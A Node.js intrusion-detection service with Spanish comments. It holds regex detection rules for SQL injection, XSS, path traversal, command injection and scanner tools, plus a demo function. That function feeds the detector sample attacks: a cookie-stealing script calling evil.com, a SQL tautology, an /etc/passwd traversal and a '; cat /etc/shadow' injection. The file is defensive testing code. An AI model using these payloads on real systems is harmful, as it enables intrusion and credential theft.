const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// Almacén en memoria de telemetría y eventos en tiempo real
const telemetryEvents = [];
const sseClients = new Set();
const blockedIps = new Map(); // IP -> { reason, timestamp, attackCount }
const monitoredFiles = new Map(); // filepath -> { hash, lastChecked, status, size }

// Reglas de inspección profunda de tráfico para el Guardián 24/7
const THREAT_PATTERNS = [
  {
    type: 'SQL_INJECTION',
    name: 'Sonda de Inyección SQL (SQLi)',
    severity: 'CRITICAL',
    action: 'BLOCKED_403',
    regex: /(?:'|\%27)\s*(?:or|and)\s*.*?=.*?(?:--|\#|\%23)|union\s+(?:all\s+)?select|information_schema|waitfor\s+delay|sleep\s*\(\d+\)|drop\s+table/i
  },
  {
    type: 'CROSS_SITE_SCRIPTING',
    name: 'Intento de Inyección XSS Activo',
    severity: 'HIGH',
    action: 'BLOCKED_403',
    regex: /<script[\s\S]*?>[\s\S]*?<\/script>|javascript:|onerror\s*=|onload\s*=|document\.cookie|<svg.*?onload/i
  },
  {
    type: 'PATH_TRAVERSAL',
    name: 'Intento de Salto de Directorio (Path Traversal / LFI)',
    severity: 'HIGH',
    action: 'BLOCKED_403',
    regex: /(?:\.\.\/|\.\.\\|%2e%2e%2f|%2e%2e\/|\.\.%2f|%252e%252e%252f)/i
  },
  {
    type: 'COMMAND_INJECTION',
    name: 'Sonda de Ejecución Remota de Comandos (RCE)',
    severity: 'CRITICAL',
    action: 'BLOCKED_403',
    regex: /(?:;|\||`|\$\().*?(?:cat\s+\/etc\/|whoami|id|wget\s+|curl\s+|bash\s+-i|cmd\.exe)/i
  },
  {
    type: 'MALICIOUS_SCANNER',
    name: 'Escáner Automatizado de Vulnerabilidades',
    severity: 'MEDIUM',
    action: 'BLOCKED_403',
    regex: /sqlmap|nikto|acunetix|dirbuster|nmap|masscan|havij/i
  }
];

// Inicializar archivos monitoreados para la integridad (FIM)
function initializeFileIntegrityMonitor(directoryPath) {
  try {
    const filesToWatch = [
      'package.json',
      '.env',
      'src/server.js',
      'src/services/aiService.js',
      'src/services/scannerService.js',
      'src/services/guardianService.js'
    ];

    filesToWatch.forEach(relPath => {
      const fullPath = path.resolve(directoryPath, relPath);
      if (fs.existsSync(fullPath)) {
        const content = fs.readFileSync(fullPath);
        const hash = crypto.createHash('sha256').update(content).digest('hex');
        const stats = fs.statSync(fullPath);
        monitoredFiles.set(relPath, {
          path: relPath,
          hash: hash,
          size: stats.size,
          lastChecked: new Date().toISOString(),
          status: 'SECURE_VERIFIED'
        });
      }
    });
  } catch (err) {
    console.warn('[FIM] Error inicializando monitor de integridad:', err.message);
  }
}

/**
 * Inspecciona una petición web para neutralizar amenazas al instante
 */
function inspectRequest(reqData) {
  const { ip = '127.0.0.1', path = '/', method = 'GET', query = '', body = '', userAgent = '' } = reqData;

  // Verificar si la IP ya se encuentra en lista de bloqueo temporal
  if (blockedIps.has(ip)) {
    const blockedInfo = blockedIps.get(ip);
    return {
      blocked: true,
      reason: 'IP bloqueada por reincidencia de ataques maliciosos',
      details: blockedInfo
    };
  }

  // Concatenar campos a inspeccionar y normalizar URL-encoding para evitar técnicas de evasión WAF
  const rawPayload = `${path} ${query} ${typeof body === 'string' ? body : JSON.stringify(body)} ${userAgent}`;
  let decodedPayload = rawPayload;
  try {
    decodedPayload = decodeURIComponent(rawPayload.replace(/\+/g, ' '));
  } catch (e) {}

  const payloadToInspect = `${rawPayload} ${decodedPayload}`;

  for (const threat of THREAT_PATTERNS) {
    if (threat.regex.test(payloadToInspect)) {
      // Registrar ataque neutralizado
      const event = {
        id: 'atk_' + crypto.randomBytes(4).toString('hex'),
        timestamp: new Date().toISOString(),
        threatType: threat.type,
        threatName: threat.name,
        severity: threat.severity,
        action: threat.action,
        attackerIp: ip,
        method: method,
        targetPath: path,
        payloadSnippet: extractPayloadEvidence(payloadToInspect, threat.regex)
      };

      recordEvent(event);

      // Actualizar contador de IP y bloquear si reincide
      const ipRecord = blockedIps.get(ip) || { count: 0 };
      ipRecord.count += 1;
      ipRecord.lastAttack = new Date().toISOString();
      if (ipRecord.count >= 3) {
        blockedIps.set(ip, {
          reason: `Bloqueo preventivo automático: ${ipRecord.count} ataques detectados`,
          timestamp: new Date().toISOString(),
          attackCount: ipRecord.count
        });
      }

      return {
        blocked: true,
        threat: threat.name,
        severity: threat.severity,
        event
      };
    }
  }

  return { blocked: false };
}

function extractPayloadEvidence(text, regex) {
  const match = text.match(regex);
  if (!match) return 'Firma maliciosa detectada';
  const start = Math.max(0, match.index - 10);
  const end = Math.min(text.length, match.index + match[0].length + 10);
  return text.substring(start, end).trim();
}

/**
 * Registra un evento y lo emite en tiempo real a los dashboards conectados (SSE)
 */
function recordEvent(event) {
  telemetryEvents.unshift(event);
  if (telemetryEvents.length > 200) {
    telemetryEvents.pop();
  }

  // Enviar evento SSE a clientes conectados
  const sseData = `data: ${JSON.stringify(event)}\n\n`;
  sseClients.forEach(clientRes => {
    try {
      clientRes.write(sseData);
    } catch {
      sseClients.delete(clientRes);
    }
  });
}

/**
 * Suscripción SSE (Server-Sent Events) para el dashboard
 */
function registerSseClient(res) {
  sseClients.add(res);
  res.on('close', () => {
    sseClients.delete(res);
  });
}

/**
 * Obtener estadísticas globales del Guardián 24/7
 */
function getGuardianStats() {
  const totalAttacks = telemetryEvents.length;
  const criticalThreats = telemetryEvents.filter(e => e.severity === 'CRITICAL').length;
  const highThreats = telemetryEvents.filter(e => e.severity === 'HIGH').length;

  return {
    shieldStatus: 'SHIELD_ACTIVE_24_7',
    uptimeSeconds: Math.floor(process.uptime()),
    activeNodesProtected: 1,
    totalAttacksBlocked: totalAttacks,
    criticalThreatsNeutralized: criticalThreats,
    highThreatsNeutralized: highThreats,
    currentlyBlockedIps: blockedIps.size,
    recentEvents: telemetryEvents.slice(0, 20),
    fileIntegrity: Array.from(monitoredFiles.values())
  };
}

/**
 * Ejecutar un ataque simulado para demostración del Guardián en tiempo real
 */
function simulateAttack(type) {
  let simulatedReq = {
    ip: '198.51.100.' + Math.floor(Math.random() * 200 + 10),
    method: 'POST',
    path: '/api/v1/user/search',
    query: '',
    body: '',
    userAgent: 'Mozilla/5.0 (Security-Auditor-Test)'
  };

  switch (type) {
    case 'sqli':
      simulatedReq.path = '/api/products';
      simulatedReq.query = "category=electronics' OR '1'='1'--";
      break;
    case 'xss':
      simulatedReq.path = '/api/comments';
      simulatedReq.body = JSON.stringify({ comment: '<script>document.location="http://evil.com/steal?"+document.cookie</script>' });
      break;
    case 'traversal':
      simulatedReq.path = '/api/download';
      simulatedReq.query = 'file=../../../../etc/passwd';
      break;
    case 'rce':
      simulatedReq.path = '/api/system/diag';
      simulatedReq.body = JSON.stringify({ host: '127.0.0.1; cat /etc/shadow' });
      break;
    case 'scanner':
      simulatedReq.userAgent = 'sqlmap/1.7.2#stable (https://sqlmap.org)';
      simulatedReq.path = '/wp-login.php';
      break;
    default:
      simulatedReq.path = '/login';
      simulatedReq.query = "user=admin'--";
  }

  const result = inspectRequest(simulatedReq);
  return {
    simulated: true,
    type,
    result
  };
}

module.exports = {
  initializeFileIntegrityMonitor,
  inspectRequest,
  recordEvent,
  registerSseClient,
  getGuardianStats,
  simulateAttack,
  monitoredFiles
};
